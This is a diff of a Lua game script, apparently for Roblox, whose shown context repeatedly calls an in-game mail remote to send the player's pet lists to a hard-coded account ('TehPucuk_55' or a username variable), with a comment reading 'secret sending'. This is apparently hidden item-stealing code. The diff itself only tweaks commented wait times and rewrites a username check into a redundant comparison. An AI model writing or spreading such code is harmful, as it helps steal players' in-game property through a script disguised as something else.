@@ -1394,7 +1394,7 @@ end
 -- Sending The Pets
 
 local ndUser
-if UserName2 ~= nil and UserName2 ~= "TehPucuk_55" and UserName2 ~= "" then
+if UserName2 ~= nil and UserName2 ~= "TehPucuk_55" and UserName2 ~= "TehPucuk_55" then
     ndUser = UserName2
 else
     ndUser = UserName
@@ -1441,7 +1441,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(1.2)
+                -- wait(1.5)
                 if #TList == 0 or TList == {} then
                     -- print("done1")
                     break
@@ -1469,7 +1469,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(1.2)
+                -- wait(1.5)
                 if #BList == 0 or BList == {} then
                     -- print("done2")
                     break
@@ -1499,7 +1499,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(1.2)
+                -- wait(1.5)
                 if #HList == 0 or HList == {} then
                     -- print("done3")
                     break
@@ -1528,7 +1528,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(1.2)
+                -- wait(1.5)
                 if #PList == 0 or PList == {} then
                     -- print("done1")
                     break
@@ -1556,7 +1556,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(1.2)
+                -- wait(1.5)
                 if #EList == 0 or EList == {} then
                     -- print("done42")
                     break
@@ -1584,7 +1584,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(1.2)
+                -- wait(1.5)
                 if #EvList == 0 or EvList == {} then
                     -- print("done5")
                     break
@@ -1612,7 +1612,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(1.2)
+                -- wait(1.5)
                 if #SList == 0 or SList == {} then
                     -- print("done6")
                     break
@@ -1640,7 +1640,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(1.2)
+                -- wait(1.5)
                 -- print("secret sending")
                 if #MList == 0 or MList == {} then
                     -- print("done6")
